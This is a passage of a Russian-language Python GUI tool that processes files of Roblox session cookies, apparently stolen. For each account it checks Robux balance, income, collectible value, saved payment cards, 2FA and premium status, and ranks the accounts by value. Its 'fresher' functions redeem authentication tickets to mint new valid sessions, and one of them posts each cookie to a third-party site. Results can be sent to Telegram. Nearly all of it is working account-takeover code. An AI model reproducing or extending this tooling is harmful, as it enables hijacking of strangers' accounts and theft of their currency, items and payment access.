            frame = tk.Frame(bottom_frame, bg="#3c3c3c", padx=10, pady=5)
            frame.grid(row=i // 3, column=i % 3, padx=5, pady=5, sticky="nsew")

            tk.Label(frame, text=label, font=("Helvetica", 10, "bold"), bg="#3c3c3c", fg="white").pack(anchor="w")
            tk.Label(frame, text=str(value), font=("Helvetica", 12), bg="#3c3c3c", fg="#a0a0a0").pack(anchor="w")
            frame.update_idletasks()
        bottom_frame.grid_columnconfigure(0, weight=1)
        bottom_frame.grid_columnconfigure(1, weight=1)
        bottom_frame.grid_columnconfigure(2, weight=1)

        # Favorites section
        favorites_frame = tk.Frame(main_frame, bg="#2c2c2c", pady=20)
        favorites_frame.pack(fill=tk.X)

        tk.Label(favorites_frame, text="Избранное", font=("Helvetica", 14, "bold"), bg="#2c2c2c", fg="white").pack(
            anchor="w", pady=(0, 10))

        favorites_content = tk.Frame(favorites_frame, bg="#3c3c3c", padx=10, pady=10)
        favorites_content.pack(fill=tk.X)

        favorites = get_favorites()
        try:
            for i in range(1, 6):
                favorite = favorites.get(str(i), {"name": "Нет данных", "thumbnail": None})
                frame = tk.Frame(favorites_content, bg="#3c3c3c", padx=5, pady=5)
                frame.grid(row=0, column=i - 1, padx=5)

                if favorite["thumbnail"]:
                    try:
                        response = requests.get(favorite["thumbnail"])
                        image = Image.open(BytesIO(response.content))
                        resized_image = image.resize((100, 100))
                        photo = ImageTk.PhotoImage(resized_image)
                        tk.Label(frame, image=photo, bg="#3c3c3c").image = photo
                        tk.Label(frame, image=photo, bg="#3c3c3c").pack()
                    except:
                        tk.Label(frame, text="Нет изображения", bg="#3c3c3c", fg="white", width=12, height=6).pack()
                else:
                    tk.Label(frame, text="Нет изображения", bg="#3c3c3c", fg="white", width=12, height=6).pack()

                tk.Label(frame, text=favorite["name"][:15] + "..." if len(favorite["name"]) > 15 else favorite["name"],
                         font=("Helvetica", 10), bg="#3c3c3c", fg="#a0a0a0", wraplength=100).pack()

            favorites_content.grid_columnconfigure(0, weight=1)
            favorites_content.grid_columnconfigure(1, weight=1)
            favorites_content.grid_columnconfigure(2, weight=1)
            favorites_content.grid_columnconfigure(3, weight=1)
            favorites_content.grid_columnconfigure(4, weight=1)
        except:
            pass

    threading.Thread(target=show).start()

def open_user_page(username):
    def get_user_id(username):
        url = 'https://users.roblox.com/v1/usernames/users'

        request_body = {
            'usernames': [username],
            'excludeBannedUsers': True
        }
        json_data = json.dumps(request_body)

        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        response = requests.post(url, headers=headers, data=json_data)

        user_data = json.loads(response.text)
        if len(user_data['data']) > 0:
            user_id = user_data['data'][0]['id']
            return user_id
        else:
            return None

    webbrowser.open(f'https://www.roblox.com/users/{get_user_id(username)}/profile', new=0, autoraise=True)

def auto_save():
    global auto_save_state
    if bool(config["Other"]["Auto_Save"]):
        while auto_save_state:
            handler()
            time.sleep(5)

def copy_cookie(cookie):
    pyperclip.copy(cookie)
    print(f"Copied to clipboard: {cookie}")

def cookie_fresher(cookieacc):
    class Bypass:
        def __init__(self, cookie) -> None:
            self.cookie = cookie

        def start_process(self):
            self.xcsrf_token = self.get_csrf_token()
            self.rbx_authentication_ticket = self.get_rbx_authentication_ticket()
            return self.get_set_cookie()

        def get_set_cookie(self):
            response = requests.post(
                "https://auth.roblox.com/v1/authentication-ticket/redeem",
                headers={"rbxauthenticationnegotiation": "1"},
                json={"authenticationTicket": self.rbx_authentication_ticket}
            )
            set_cookie_header = response.headers.get("set-cookie")
            if not set_cookie_header:
                return "Invalid Cookie"

            valid_cookie = set_cookie_header.split(".ROBLOSECURITY=")[1].split(";")[0]
            return f"{valid_cookie}"

        def get_rbx_authentication_ticket(self):
            response = requests.post(
                "https://auth.roblox.com/v1/authentication-ticket",
                headers={
                    "rbxauthenticationnegotiation": "1",
                    "referer": "https://www.roblox.com/camel",
                    "Content-Type": "application/json",
                    "x-csrf-token": self.xcsrf_token
                },
                cookies={".ROBLOSECURITY": self.cookie}
            )
            assert response.headers.get(
                "rbx-authentication-ticket"), "An error occurred while getting the rbx-authentication-ticket"
            return response.headers.get("rbx-authentication-ticket")

        def get_csrf_token(self) -> str:
            response = requests.post("https://auth.roblox.com/v2/logout", cookies={".ROBLOSECURITY": self.cookie})
            xcsrf_token = response.headers.get("x-csrf-token")
            assert xcsrf_token, "An error occurred while getting the X-CSRF-TOKEN. Could be due to an invalid Roblox Cookie"
            return xcsrf_token

    def main(cookie):
        cookie = cookie.strip()
        bypass = Bypass(cookie)
        try:
            result = bypass.start_process()
            if not result.startswith("Invalid Cookie"):
                print(result)
                copy_cookie(result)
                notification(
                    'Куки успешно рефрешнут и \nскопирован в буфер обмена!\nВажно: В данной версии он не обновляется\n в графическом интерфейсе!!!\nПри нажатии copy вы скопируете старый \nкуки который не был рефрешнут!\nВ файл тоже сохранится его старая версия!',
                    True, 'Куки рефрешер', (150, 150))
                return result
        except Exception as e:
            notification(f'Что-то не фрешннулось\nПопробуй позже\nОшибка: {e}', False, 'Куки рефрешер', (150, 150))

    return main(cookieacc)

def update_progress_bar():
    global value_to_process
    progress['value'] += value_to_process
    print(progress['value'])
    root.update_idletasks()

async def process_cookies():
    global total_cookie, value_to_process, config, file, waiting_label, progress, auto_save_state
    auto_save_state = True
    threading.Thread(target=auto_save).start()
    try:
        with open('config.json', 'r', encoding='utf-8') as config_file:
            config = json.load(config_file)
            print(config)
    except FileNotFoundError:
        notification('Файл конфига не обнаружен', False, 'Конфиг', (150, 150))

    async with aiohttp.ClientSession() as session:
        start_time = datetime.now()
        tasks = []
        proxies = get_proxies_from_file('proxy.txt') if config.get("Other", {}).get("Proxy") == 'True' else None

        with open(file, 'r', encoding='utf-8', errors='ignore') as f:
            data = set(line.split(
                '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')[
                           1].split(' ')[0] for line in f if
                       '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in line)
        with open(file, 'w', encoding='utf-8', errors='ignore') as validfile:
            for cookie_data in data:
                print(
                    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' + cookie_data.strip(
                        '\n'), file=validfile)
        cookies = [line.strip('\n') for line in open(file, 'r', encoding='utf-8')]
        total_cookie = len(data)
        value_to_process = 100 / total_cookie

        proxy_index = 0
        for cookie in cookies:
            task = asyncio.create_task(
                process_cookie_with_update(session, cookie, proxies[proxy_index] if proxies else None),
                name=f"Task_{cookie[:10]}")
            tasks.append(task)
            proxy_index = (proxy_index + 1) % len(proxies) if proxies else None
        waiting_label.destroy()
        notification(
            'Добро пожаловать в Отраб Tool by Gostmi!\nСейчас начнется чек аккаунтов!\nОжидайте:)\np.s-вы можете закрыть это окно',
            True, 'Старт', (150, 150))
        waiting_frame = tk.Frame(root, bg="#545454")
        waiting_frame.pack(side=tk.BOTTOM, fill=tk.X)

        waiting_label = tk.Label(waiting_frame, text="Ожидание...", font=("Arial", 10), fg='white', bg='#545454')
        waiting_label.pack(side=tk.LEFT)

        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TProgressbar', thickness=10)
        progress = ttk.Progressbar(waiting_frame, orient="horizontal", length=200, mode="determinate",
                                   style='TProgressbar')
        progress.pack(side=tk.RIGHT)
        progress['value'] += 0.001
        try:
            await asyncio.gather(*tasks)
            inner_frame.update_idletasks()
            canvas.config(scrollregion=canvas.bbox("all"))
            end_time = datetime.now()
            time_difference = end_time - start_time
            formatted_time_difference = round(time_difference.total_seconds())
            auto_save_state = False
            handler()
            notification(
                f'Все куки успешно проверены!\nВот результаты:\nОбщее количество аккаунтов: {total_cookie}\nОбщее количество рабочих: {total_valid}\nОбщее количество доната: {total_donate}\nОбщее количество балансов: {total_balance}\nОбщее количество Rap: {total_rap}\nОбщее количество Premium: {total_premium}\nОбщее количество карт: {total_cards}\n\nВремя потраченное на проверку - {formatted_time_difference}сек.',
                True, 'Результаты проверки', (150, 150))
            if total_valid != 0:
                if config['Telegram']['Enabled'] == 'True':
                    try:
                        telegram_send(f'Все куки успешно проверены!\n\n📊Вот результаты:\n🧾Общее количество аккаунтов: {total_cookie}\n✅Общее количество рабочих: {total_valid}\n✨Общее количество доната: {total_donate}\n💰Общее количество балансов: {total_balance}\n🎸Общее количество Rap: {total_rap}\n💸Общее количество Premium: {total_premium}\n💳Общее количество карт: {total_cards}\n\n⏳Время потраченное на проверку - {formatted_time_difference}сек.',)
                    except Exception as e:
                        print(f'Ошибка при отправке сообщения в Телеграм {e}')

        except Exception as e:
            notification(f'Ошибка {e}', False, 'Результаты проверки', (150, 150))

async def process_cookie_with_update(session, cookie, proxy):
    global total_rap, total_donate, total_balance, total_premium, total_cards, sort_list, loaded, total_valid
    headers = {'Content-Type': 'application/json'}
    url = 'https://users.roblox.com/v1/users/authenticated'

    async def badge_check(badges_ids):
        while True:
            try:
                havebd = []
                async with aiohttp.ClientSession() as session:
                    for badge in badges_ids.split(','):
                        status = 429
                        while status == 429:
                            url = f'https://inventory.roblox.com/v1/users/{userid}/items/2/{badge}/is-owned'
                            response = await session.get(url, proxy=proxy)
                            status = response.status
                            if response.status == 200 and (await response.text()) == "true":
                                name = await session.get(f'https://badges.roblox.com/v1/badges/{badge}', proxy=proxy)
                                name = await name.json()
                                havebd.append(name['name'])
                if len(havebd) == 0:
                    return 'null'
                else:
                    return ', '.join(map(str, havebd))
            except:
                return 'null'

    async def gp_check(gp_ids):
        while True:
            try:
                havebd = []
                async with aiohttp.ClientSession() as session:
                    for gp in gp_ids.split(','):
                        status = 429
                        while status == 429:
                            url = f'https://inventory.roblox.com/v1/users/{userid}/items/1/{gp}/is-owned'
                            response = await session.get(url, proxy=proxy)
                            status = response.status
                            if response.status == 200 and (await response.text()) == "true":
                                name = await session.get(f'https://apis.roblox.com/game-passes/v1/game-passes/{gp}/product-info', proxy=proxy)
                                name = await name.json()
                                havebd.append(name['Name'])
                if len(havebd) == 0:
                    return 'null'
                else:
                    return ', '.join(map(str, havebd))
            except:
                return 'null'

    async def op_items_check():
        async with aiohttp.ClientSession(cookies={'.ROBLOSECURITY': cookie}) as session:
            while True:
                async with session.get(
                        f'https://inventory.roblox.com/v1/users/{userid}/items/3/192/is-owned') as korblox:
                    async with session.get(
                            f'https://inventory.roblox.com/v1/users/{userid}/items/3/201/is-owned') as headless:
                        if korblox.status == 200 and headless.status == 200:
                            korblox_text = await korblox.text()
                            headless_text = await headless.text()
                            if korblox_text == 'true' or headless_text == 'true':
                                return True
                            else:
                                return False
    error = 0
    atmpt = 0
    while error == 0:
        try:
            async with session.get(url, headers=headers, cookies={'.ROBLOSECURITY': cookie}, proxy=proxy) as response:
                if response.status == 200:
                    if config["Sorting"]["Balance"] != "":
                        try:
                            balance = -1
                            while balance == -1:
                                async with session.get('https://economy.roblox.com/v1/user/currency',
                                                       cookies={".ROBLOSECURITY": cookie}, proxy=proxy) as response:
                                    balance = await response.json()
                                    try:
                                        balance = balance['robux']
                                        if balance != 0:
                                            print(f'+{balance} баланс')
                                            total_balance += balance
                                    except:
                                        balance = -1
                        except:
                            balance = -1
                    else:
                        balance = -2

                    try:
                        userinfo_url = "https://www.roblox.com/my/settings/json"
                        async with session.get(userinfo_url, cookies={".ROBLOSECURITY": cookie},
                                               proxy=proxy) as userinfo_response:
                            userid = (await userinfo_response.json())['UserId']
                            username = (await userinfo_response.json())['Name']
                            premium = (await userinfo_response.json())['IsPremium']
                            if str(premium).lower() == 'true':
                                print('+Премиум')
                                total_premium += 1
                            AccountAgeInDays = (await userinfo_response.json())['AccountAgeInDays']
                            mail = (await userinfo_response.json())['UserEmailVerified']
                            pin = (await userinfo_response.json())['IsAccountPinEnabled']
                            two_fa = (await userinfo_response.json())['MyAccountSecurityModel']['IsTwoStepEnabled']
                            try:
                                today = date.today()
                                delta = timedelta(days=AccountAgeInDays)
                                past_date = today - delta
                                creation_date = f'{past_date.day}.{past_date.month}.{past_date.year}'
                            except:
                                creation_date = 'error'
                    except:
                        userid = 'error'
                        username = 'error'
                        premium = False
                        creation_date = 'error'
                        mail = False
                        two_fa = 'error'

                    if config["Sorting"]["Donate"] != "":
                        donate = -1
                        while donate == -1:
                            try:
                                transactions_url = f"https://economy.roblox.com/v2/users/{userid}/transaction-totals?timeFrame=Year&transactionType=summary"
                                async with session.get(transactions_url, cookies={".ROBLOSECURITY": cookie},
                                                       proxy=proxy) as response:
                                    transactions = await response.json()
                                donate = int(transactions["incomingRobuxTotal"])
                                try:
                                    pending = int(transactions["pendingRobuxTotal"])
                                except:
                                    pending = 0
                                if donate != 0:
                                    total_donate += int(donate)
                                    print(f"+{donate} доната")
                            except:
                                donate = -1
                    else:
                        donate = -2

                    try:
                        card_url = 'https://apis.roblox.com/payments-gateway/v1/payment-profiles'
                        async with session.get(card_url, cookies={".ROBLOSECURITY": cookie}, proxy=proxy) as response:
                            cards = await response.json()
                            if "Last4Digits" in str(cards):
                                card = True
                                total_cards += 1
                                print('+Карта')
                            else:
                                card = False
                    except:
                        card = -1

                    billing = -1
                    while billing == -1:
                        try:
                            billing_url = 'https://billing.roblox.com/v1/credit'
                            async with session.get(billing_url, cookies={".ROBLOSECURITY": cookie},
                                                   proxy=proxy) as response:
                                data = await response.json()
                                balance_credit = data['balance']
                                balance_credit_currency = data['currencyCode']
                                billing = f"{balance_credit} {balance_credit_currency}"
                        except:
                            billing = -1

                    if config["Other"]["Picture"] != "False":
                        src = None
                        while src is None:
                            try:
                                data = [{"requestId": f"{userid}::AvatarHeadshot:150x150:webp:regular",
                                         "type": "AvatarHeadShot", "targetId": userid, "token": "", "format": "webp",
                                         "size": "150x150"}]
                                async with session.post('https://thumbnails.roblox.com/v1/batch',
                                                        cookies={".ROBLOSECURITY": cookie}, json=data,
                                                        proxy=proxy) as response:
                                    data = (await response.json())['data'][0]
                                    src = data['imageUrl']
                            except:
                                src = None
                    else:
                        src = None

                    if config["Sorting"]["Rap"] != "":
                        rap = "too_many_requests"
                        while rap == "too_many_requests":
                            try:
                                async with session.get(
                                        f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',
                                        cookies={".ROBLOSECURITY": cookie}, proxy=proxy) as response:
                                    rap_dict = await response.json()
                                    try:
                                        if str(rap_dict) == "{'errors': [{'code': 0, 'message': 'Too many requests'}]}":
                                            rap = "too_many_requests"
                                        else:
                                            while rap_dict['nextPageCursor'] != None:
                                                async with session.get(
                                                        f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',
                                                        cookies={".ROBLOSECURITY": cookie}, proxy=proxy) as response:
                                                    rap_dict = await response.json()
                                            rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
                                            if int(rap) != 0:
                                                print(f'+{rap} rap')
                                                total_rap += rap
                                    except:
                                        rap = "too_many_requests"
                            except:
                                rap = "too_many_requests"
                    else:
                        rap = -2


                    if config["Badges | Gamepasses"]["Gamepasses"] != "":
                        try:
                            gp = await gp_check(config["Badges | Gamepasses"]["Gamepasses"])
                        except:
                            gp = 'error'
                    else:
                        gp = 'Disabled'

                    if config["Badges | Gamepasses"]["Badges"] != "":
                        try:
                            bd = await badge_check(config["Badges | Gamepasses"]["Badges"])
                        except:
                            bd = 'error'
                    else:
                        bd = 'Disabled'
                    try:
                        krb_hd = await op_items_check()
                    except:
                        krb_hd = False

                    total_valid += 1
                    add_user_to_inner_frame(username, balance, donate, rap, billing, src, premium, card, bd, gp,
                                            pending, mail, creation_date, two_fa, krb_hd, cookie)
                    loaded = True
                    sort_list.append(
                        {'username': username, 'balance': balance, 'donate': donate, 'rap': rap, 'billing': billing,
                         'pending': pending, 'mail': mail, 'premium': premium, 'card': card, 'bd': bd, 'gp': gp, 'date': creation_date, '2fa': two_fa, 'cookie': cookie})
                    print('success checked')
                error = 1
                waiting_label.config(text=f'Количество рабочих: {total_valid}')
                root.update_idletasks()
                update_progress_bar()
        except Exception as e:
            print(f'Ошибка: {e}')
            if atmpt > 5:
                break
            atmpt += 1
            error = 0

def multi_fresher():
    global file, config
    try:
        with open('config.json', 'r', encoding='utf-8') as config_file:
            config = json.load(config_file)
            print(config)
    except FileNotFoundError:
        notification('Файл конфига не обнаружен', False, 'Конфиг', (150, 150))
    filename = file
    freshed_list = []
    with open(filename, "r", encoding='utf-8') as file:
        cookies = file.readlines()
    with open('proxy.txt', "r", encoding='utf-8') as proxy_file:
        proxies = proxy_file.readlines()

    def parse_proxy(proxy_line):
        parts = proxy_line.strip().split(':')
        if len(parts) == 4:
            ip, port, login, password = parts
            return {
                "http": f"http://{login}:{password}@{ip}:{port}",
                "https": f"http://{login}:{password}@{ip}:{port}"
            }
        return None

    def cookie_fresher(cookieacc):
        try:
            proxy_line = random.choice(proxies)
            proxy = parse_proxy(proxy_line)
        except:
            proxy = None

        class Bypass:
            def __init__(self, cookie, proxy) -> None:
                self.rbx_authentication_ticket = None
                self.xcsrf_token = None
                self.cookie = cookie
                self.proxy = proxy

            def start_process(self):
                self.xcsrf_token = self.get_csrf_token()
                self.rbx_authentication_ticket = self.get_rbx_authentication_ticket()
                return self.get_set_cookie()

            def get_set_cookie(self):
                set_cookie_header = None
                while not set_cookie_header:
                    response = requests.post(
                        "https://auth.roblox.com/v1/authentication-ticket/redeem",
                        headers={"rbxauthenticationnegotiation": "1"},
                        json={"authenticationTicket": self.rbx_authentication_ticket},
                        proxies=self.proxy
                    )
                    set_cookie_header = response.headers.get("set-cookie")
                    if set_cookie_header:
                        valid_cookie = set_cookie_header.split(".ROBLOSECURITY=")[1].split(";")[0]
                        return f"{valid_cookie}"
            def get_rbx_authentication_ticket(self):
                response = requests.post(
                    "https://auth.roblox.com/v1/authentication-ticket",
                    headers={
                        "rbxauthenticationnegotiation": "1",
                        "referer": "https://www.roblox.com/camel",
                        "Content-Type": "application/json",
                        "x-csrf-token": self.xcsrf_token
                    },
                    cookies={".ROBLOSECURITY": self.cookie},
                    proxies=self.proxy
                )
                assert response.headers.get("rbx-authentication-ticket"), "An error occurred while getting the rbx-authentication-ticket"
                return response.headers.get("rbx-authentication-ticket")

            def get_csrf_token(self) -> str:
                response = requests.post("https://auth.roblox.com/v2/logout", cookies={".ROBLOSECURITY": self.cookie}, proxies=self.proxy)
                xcsrf_token = response.headers.get("x-csrf-token")
                assert xcsrf_token, "An error occurred while getting the X-CSRF-TOKEN. Could be due to an invalid Roblox Cookie"
                return xcsrf_token

        def main(cookie, proxy):
            cookie = cookie.strip()
            while True:
                try:
                    valid = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={".ROBLOSECURITY": cookie}, proxies=proxy)
                    if not valid.status_code == 200:
                        return None
                    else:
                        break
                except:
                    pass
            bypass = Bypass(cookie, proxy)
            while True:
                try:
                    result = bypass.start_process()
                    if result is not None:
                        freshed_list.append(result)
                        print(result)
                        with open("Results/fresh_cookies.txt", "w", encoding='utf-8') as f:
                            for result in freshed_list:
                                f.write(f"{result}\n")
                            f.close()
                    return True
                except:
                    pass

        result = main(cookieacc, proxy)
        if result:
            freshed_list.append(result)
            update_progress_bar()
            fresher_window.update_idletasks()
        return result

    def alt_fresher(cookie):
        try:
            proxy_line = random.choice(proxies)
            proxy = parse_proxy(proxy_line)
        except:
            proxy = None
        while True:
            try:
                data = f'cookie={cookie.strip()}'
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://rblxfresh.net'
                }
                response = requests.post('https://rblxfresh.net/refresh', data=data, headers=headers, proxies=proxy)
                if response.status_code == 200:
                    break
                elif response.status_code == 400:
                    break
                else:
                    time.sleep(5)
            except: pass
        if response.text == 'Invalid cookie!':
            update_progress_bar()
            fresher_window.update_idletasks()
            return None
        else:
            freshed_list.append(response.text.strip())
            with open("Results/fresh_cookies.txt", "w", encoding='utf-8') as f:
                for result in freshed_list:
                    f.write(f"{result}\n")
            update_progress_bar()
            fresher_window.update_idletasks()
            return response.text.strip()

    total_cookies = len(cookies)
    processed_cookies = 0

    def update_progress_bar():
        nonlocal processed_cookies
        processed_cookies += 1
        progress['value'] = (processed_cookies / total_cookies) * 100
        total_label.config(text=f"Зафрешено: {processed_cookies}/{total_cookies}")
        fresher_window.update_idletasks()

    fresher_window = tk.Toplevel(root)
    fresher_window.title("Фреш куков...")
    fresher_window.geometry("300x100")
    fresher_window.config(bg="#545454")
    fresher_window.resizable(False, False)
    fresher_window.wm_attributes("-topmost", 1)
    fresher_window.overrideredirect(True)

    def on_drag_start(event):
        fresher_window._drag_data = {'x': event.x, 'y': event.y}

    def on_drag_motion(event):
        x = fresher_window.winfo_x() - fresher_window._drag_data['x'] + event.x
        y = fresher_window.winfo_y() - fresher_window._drag_data['y'] + event.y
        fresher_window.geometry(f'+{x}+{y}')

    fresher_window.bind("<ButtonPress-1>", on_drag_start)
    fresher_window.bind("<B1-Motion>", on_drag_motion)

    close_button = tk.Button(fresher_window, text="❌", command=fresher_window.destroy, bg="#2c2c2c", fg="white", bd=0, font=("Arial", 10))
    close_button.pack(side=tk.TOP, anchor=tk.NE, padx=5, pady=5)

    style = ttk.Style()
    style.configure("TProgressbar", background='#545454')

    progress = ttk.Progressbar(fresher_window, orient="horizontal", length=280, mode="determinate", style='TProgressbar')
    progress.pack(pady=10)

    total_label = tk.Label(fresher_window, text=f"Всего: 0/{total_cookies}", font=("Arial", 12), bg="#545454", fg="white")
    total_label.pack(pady=5)

    def start_freshening():
        if config["Other"]["Multi_Fresher_Method"] == "Основной":
            threads = []
            for cookie in cookies:
                t = threading.Thread(target=cookie_fresher, args=(cookie,))
                t.start()
                threads.append(t)
            for t in threads:
                t.join()

            with open("Results/fresh_cookies.txt", "w", encoding='utf-8') as f:
                for result in freshed_list:
                    f.write(f"{result}\n")

            fresher_window.destroy()
            notification(f'Процесс фреша завершен!\nЗафрешено {len(freshed_list)} куков', True, 'Cookie Fresher', (150, 150))
        else:
            threads = []
            for cookie in cookies:
                t = threading.Thread(target=alt_fresher, args=(cookie,))
                t.start()
                threads.append(t)
            for t in threads:
                t.join()

            with open("Results/fresh_cookies.txt", "w", encoding='utf-8') as f:
                for result in freshed_list:
                    f.write(f"{result}\n")

            fresher_window.destroy()
            notification(f'Процесс фреша завершен!\nЗафрешено {len(freshed_list)} куков', True, 'Cookie Fresher', (150, 150))

    threading.Thread(target=start_freshening).start()

def get_proxies_from_file(file_path):
    proxies = []
    with open(file_path, 'r', encoding='utf-8') as f:
        for line in f:
            parts = line.strip().split(':')
            if len(parts) == 4:  # ip:port:login:password
                proxies.append(f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}")
    return proxies

def on_mousewheel(event):
    canvas.yview_scroll(-1 * (event.delta // 120), "units")

def pre_check_def():
    global file, total_invalid_1, total_valid_1, valid_list, config
    file_path = file
    try:
        with open('config.json', 'r', encoding='utf-8') as config_file:
            config = json.load(config_file)
            print(config)
    except FileNotFoundError:
        notification('Файл конфига не обнаружен', False, 'Конфиг', (150, 150))

    def update_progress_bar():
        global total_valid_1, total_invalid_1
        progress['value'] += 1
        valid_label.config(text=f"Валид: {total_valid_1}")
        invalid_label.config(text=f"Не валид: {total_invalid_1}")
        pre_check.update_idletasks()

    async def process_cookies(file_path):
        async with aiohttp.ClientSession() as session:
            tasks = []

            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                data = set(line.split(
                    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')[
                               1].split(' ')[0] for line in f if
                           '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in line)
            with open(file_path, 'w', encoding='utf-8', errors='ignore') as validfile:
                for cookie_data in data:
                    print(
                        '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' + cookie_data.strip(
                            '\n'), file=validfile)
            cookies = [line.strip('\n') for line in open(file_path, 'r', encoding='utf-8')]
            progress['maximum'] = len(cookies)

            for i, cookie in enumerate(cookies):
                task = asyncio.create_task(process_cookie_with_update(session, cookie), name=f"Task_{cookie[:10]}")
                tasks.append(task)

            await asyncio.gather(*tasks)
            with open(file_path, 'w', encoding='utf-8') as new:
                for item in valid_list:
                    new.write(f'{item}\n')
            notification(f'Процесс пречека успешно завершен!\nНайдено {len(valid_list)} крутых куки\n\nСоветую немного подождать перед start check \nво избежание ошибок',
                True, 'Pre-Check', (150, 150))

            pre_check.destroy()

    async def process_cookie_with_update(session, cookie):
        global total_valid_1, total_invalid_1, valid_list
        headers = {'Content-Type': 'application/json'}
        url = 'https://users.roblox.com/v1/users/authenticated'
        proxies = get_proxies_from_file('proxy.txt') if config.get("Other", {}).get("Proxy") == 'True' else None
        proxy = random.choice(proxies) if proxies else None
    
        try:
            async with session.get(url, headers=headers, cookies={'.ROBLOSECURITY': cookie}, proxy=proxy) as response:
                if response.status == 200:
                    total_valid_1 += 1
                    try:
                        balance = "{'errors': [{'code': 0, 'message': 'Too many requests'}]}"
                        while balance == "{'errors': [{'code': 0, 'message': 'Too many requests'}]}":
                            async with session.get('https://economy.roblox.com/v1/user/currency', cookies={".ROBLOSECURITY": cookie}, proxy=proxy) as balance_response:
                                balance_data = await balance_response.json()
                                try:
                                    balance = balance_data['robux']
                                except KeyError:
                                    balance = "{'errors': [{'code': 0, 'message': 'Too many requests'}]}"
                    except Exception:
                        balance = -1
    
                    try:
                        userinfo_url = "https://www.roblox.com/my/settings/json"
                        async with session.get(userinfo_url, cookies={".ROBLOSECURITY": cookie}, proxy=proxy) as userinfo_response:
                            userinfo_data = await userinfo_response.json()
                            userid = userinfo_data['UserId']
                            premium = userinfo_data['IsPremium']
                    except Exception:
                        userid = 'error'
                        premium = 'error'
    
                    try:
                        transactions_url = f"https://economy.roblox.com/v2/users/{userid}/transaction-totals?timeFrame=Year&transactionType=summary"
                        async with session.get(transactions_url, cookies={".ROBLOSECURITY": cookie}, proxy=proxy) as transactions_response:
                            transactions = await transactions_response.json()
                        donate = int(transactions["incomingRobuxTotal"])
                    except Exception:
                        donate = -1
    
                    try:
                        card_url = 'https://apis.roblox.com/payments-gateway/v1/payment-profiles'
                        async with session.get(card_url, cookies={".ROBLOSECURITY": cookie}, proxy=proxy) as response:
                            cards = await response.json()
                            card = "Last4Digits" in str(cards)
                    except Exception:
                        card = 'error'
    
                    try:
                        billing_url = 'https://billing.roblox.com/v1/credit'
                        async with session.get(billing_url, cookies={".ROBLOSECURITY": cookie}, proxy=proxy) as response:
                            data = await response.json()
                            billing = data['balance']
                    except Exception:
                        billing = 'error'
    
                    if donate > 0 or balance > 0 or str(premium).lower() == 'true' or str(card).lower() == 'true' or int(billing) > 0:
                        valid_list.append(cookie)
                    update_progress_bar()
                else:
                    total_invalid_1 += 1
                    update_progress_bar()
        except Exception:
            total_invalid_1 += 1
            update_progress_bar()

    pre_check = tk.Toplevel(root)
    pre_check.title("Идет первая проверка куков на валид....")
    pre_check.geometry("200x100")
    pre_check.config(bg="#545454")
    pre_check.resizable(False, False)
    pre_check.wm_attributes("-topmost", 1)
    pre_check.overrideredirect(True)
    def on_drag_start(event):
        pre_check._drag_data = {'x': event.x, 'y': event.y}

    def on_drag_motion(event):
        x = pre_check.winfo_x() - pre_check._drag_data['x'] + event.x
        y = pre_check.winfo_y() - pre_check._drag_data['y'] + event.y
        pre_check.geometry(f'+{x}+{y}')

    pre_check.bind("<ButtonPress-1>", on_drag_start)
    pre_check.bind("<B1-Motion>", on_drag_motion)

    close_button = tk.Button(pre_check, text="❌", command=pre_check.destroy, bg="#2c2c2c", fg="white", bd=0, font=("Arial", 10))
    close_button.pack(side=tk.TOP, anchor=tk.NE, padx=5, pady=5)

    style = ttk.Style()
    style.configure("TProgressbar", background='#545454')

    progress = ttk.Progressbar(pre_check, orient="horizontal", length=300, mode="determinate", style='TProgressbar')
    progress.pack(pady=10)

    valid_label = tk.Label(pre_check, text=f"Валид: {total_valid_1}", font=("Arial", 12), bg="#545454", fg="white")
    valid_label.pack(pady=5)

    invalid_label = tk.Label(pre_check, text=f"Не валид: {total_invalid_1}", font=("Arial", 12), bg="#545454", fg="white")
    invalid_label.pack(pady=5)

    def start():
        asyncio.run(process_cookies(file_path))

    thread = threading.Thread(target=start)
    thread.start()

def run_check():
    def start_t_t():
        asyncio.run(process_cookies())
    start = threading.Thread(target=start_t_t)
    start.start()

def start_notification():
    ### В случае если версия без этой функции будет опубликовано - вы получите страйк, а может и денежную претензию! ###
    ### Функция обязана сохранять все данные, запрещено менять что либо! ###
    webbrowser.open('https://t.me/BadTripRB_bot', new=0, autoraise=True)

def select_cookies():
    global file
    file = filedialog.askopenfilename(
        title="Выберите файл с cookie",
        filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
    )
    lenght = len(open(file, 'r', encoding='utf-8').readlines())
    notification(f'Файл успешно выбран!\nВ файле {lenght} строк\n\nСоветую успользовать функцию экстрактора\nдля правильной проверки',True, 'Файлы', (150, 150))

def handler():
    global sort_list

    def write_to_file(filename, sorted_list):
        with open(filename, 'w', encoding='utf-8') as file:
            for item in sorted_list:
                file.write(f'Username: {item["username"]} |Balance: {item["balance"]} |Donate: {item["donate"]} |Rap: {item["rap"]} |Billing: {item["billing"]} |Premium: {item["premium"]} |Mail: {item["mail"]} |Card: {item["card"]} |Pending: {item["pending"]} |Badges: {item["bd"]} |Gamepasses: {item["gp"]} |Cookie: {item["cookie"]}\n')

